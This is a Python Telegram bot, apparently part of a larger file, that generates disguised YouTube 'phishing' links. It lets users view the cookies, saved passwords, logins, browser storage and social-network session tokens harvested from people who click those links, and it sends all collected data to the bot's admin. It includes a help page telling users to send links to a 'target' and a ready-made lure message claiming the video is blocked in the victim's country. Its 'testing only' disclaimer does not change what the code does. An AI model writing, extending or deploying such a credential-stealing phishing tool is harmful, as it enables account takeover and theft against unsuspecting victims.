async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    url = update.message.text.strip()
    
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    video_id = link_generator.extract_video_id(url)
    link_id = link_generator.generate_link_id()
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    db.add_link(link)
    
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}"),
            InlineKeyboardButton("🌐 Соцсети", callback_data=f"social_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 URL: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.\n"
            "*Все собранные данные также отправятся администратору.*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Соцсети: {len(link.social_auth_data)}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        total_cookies = sum(len(link.collected_cookies) for link in user_links)
        total_passwords = sum(len(link.collected_passwords) for link in user_links)
        total_logins = sum(len(link.collected_logins) for link in user_links)
        total_storage = sum(len(link.collected_storage_data) for link in user_links)
        total_social = sum(len(link.social_auth_data) for link in user_links)
        
        message = f"""
📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*

🔗 Всего ссылок: {len(user_links)}
🍪 Всего cookies: {total_cookies}
🔑 Всего паролей: {total_passwords}
👤 Всего логинов: {total_logins}
💾 Всего данных хранилища: {total_storage}
🌐 Данных авторизации соцсетей: {total_social}

📈 *Последняя активность:*
"""
        
        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
            if link.data_collected:
                last_data = link.data_collected[-1]
                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
        
        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
        
        keyboard = []
        for link in user_links[-3:]:
            if link.data_collected:
                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "social_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
            return
        
        # Собираем статистику по соцсетям
        social_stats = {}
        for link in user_links:
            for social_data in link.social_auth_data:
                if social_data.get("type") == "social_auth_analysis":
                    platforms = social_data.get("data", {}).get("platforms", {})
                    for platform, data in platforms.items():
                        if platform not in social_stats:
                            social_stats[platform] = {
                                "count": 0,
                                "high_risk": 0,
                                "active_sessions": 0
                            }
                        
                        social_stats[platform]["count"] += 1
                        if data.get("risk_level", "").startswith("HIGH"):
                            social_stats[platform]["high_risk"] += 1
                        if "logged_in" in data.get("auth_status", ""):
                            social_stats[platform]["active_sessions"] += 1
        
        message = "🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*\n\n"
        
        if social_stats:
            for platform, stats in social_stats.items():
                message += f"*{platform.upper()}:*\n"
                message += f"• Всего записей: {stats['count']}\n"
                message += f"• Высокий риск: {stats['high_risk']}\n"
                message += f"• Активные сессии: {stats['active_sessions']}\n"
                message += "  ─────\n"
        else:
            message += "❌ Данные не найдены\n\n"
        
        message += "\n⚠️ *Примечание:* Полные данные отправлены администратору для анализа безопасности."
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_sensitive_data_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("social_"):
        link_id = data[7:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            if not link.social_auth_data:
                await query.message.reply_text("🌐 Для этой ссылки нет данных авторизации соцсетей.")
                return
            
            message = f"""
🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*

📌 Ссылка ID: `{link.id}`
🔗 Видео: {link.original_url[:50]}...
📅 Всего записей: {len(link.social_auth_data)}

📊 *Последние результаты:*
"""
            
            for social_data in link.social_auth_data[-2:]:
                if social_data.get("type") == "social_auth_analysis":
                    platforms = social_data.get("data", {}).get("platforms", {})
                    
                    for platform, data in platforms.items():
                        if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
                            message += f"\n• *{platform.upper()}*:\n"
                            message += f"  Статус: `{data.get('auth_status', 'unknown')}`\n"
                            message += f"  Риск: {data.get('risk_level', 'unknown')}\n"
                            message += f"  Cookies: {data.get('cookies_count', 0)}\n"
                            message += f"  Токены: {data.get('tokens_found', 0)}\n"
                            message += f"  Время: {social_data.get('timestamp', '')[:19]}\n"
            
            if len(link.social_auth_data) > 2:
                message += f"\n📁 *И еще {len(link.social_auth_data) - 2} записей...*"
            
            message += "\n⚠️ *Внимание:* Полные данные отправлены администратору."
            
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат
6. *Все полные данные также отправятся администратору*

🔐 *Что именно собирается:*
• Все cookies текущего сайта (включая сессионные)
• Cookies популярных соцсетей (Google, Facebook, Twitter/X, VK, Instagram)
• LocalStorage и SessionStorage
• Сохраненные в браузере пароли
• Данные автозаполнения форм
• Логины из полей ввода
• Данные из всех хранилищ браузера
• Информация о менеджерах паролей
• Данные устройства и браузера
• Сетевые данные и геолокация
• *ПАССИВНО:* Данные авторизации в соцсетях (даже без действий пользователя)

🌐 *Пассивный сбор данных авторизации:*
Система автоматически проверяет наличие:
• Активных сессий в Google аккаунтах
• Входов в Facebook
• Авторизации в Twitter/X
• Сессий ВКонтакте
• Входов в Instagram
• Сохраненных токенов и cookies
• Данных localStorage соцсетей

⏱️ *Время сбора:* ~3-20 секунд
🔒 *Безопасность:* Данные шифруются при передаче

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Все полные данные отправляются администратору
• Бот логирует все действия

🔧 *Техническая поддержка:* @support
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n"
            "Или: `/data social` - данные авторизации соцсетей\n\n"
            "Пример: `/data abc123def456`\n\n"
            "*Примечание:* Все данные также отправляются администратору.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Соцсети: {len(link.social_auth_data)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif arg == "social":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
            return
        
        total_social = sum(len(link.social_auth_data) for link in user_links)
        
        if total_social == 0:
            await update.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
            return
        
        message = f"""
🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*

📊 Общая статистика:
• Всего ссылок: {len(user_links)}
• Всего записей авторизации: {total_social}

📋 Ссылки с данными авторизации:
"""
        
        for link in user_links:
            if link.social_auth_data:
                # Анализируем последнюю запись
                last_social = link.social_auth_data[-1]
                if last_social.get("type") == "social_auth_analysis":
                    platforms = last_social.get("data", {}).get("platforms", {})
                    high_risk = [p for p, d in platforms.items() if d.get("risk_level", "").startswith("HIGH")]
                    
                    if high_risk:
                        message += f"• `{link.id}`: {', '.join(high_risk)} (высокий риск)\n"
                    else:
                        message += f"• `{link.id}`: {len(platforms)} платформ\n"
        
        message += "\nℹ️ Для подробностей используйте: `/data [ID_ссылки]`"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        message = formatter.format_sensitive_data_report(link)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

def main():
    """Запуск бота"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", show_data_command))
    
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    application.add_error_handler(error_handler)
    
    print("🤖 YouTube Data Collector Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🔐 Функции сбора ВСЕХ данных активны:")
    print("   - Cookies (включая сессионные)")
    print("   - LocalStorage и SessionStorage")
    print("   - Сохраненные пароли и логины")
    print("   - Данные автозаполнения форм")
    print("   - Пассивный сбор данных авторизации соцсетей")
    print("   - Google, Facebook, Twitter/X, VK, Instagram")
    print("   - Все данные отправляются админу")
    print("⏳ Ожидание команд...")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()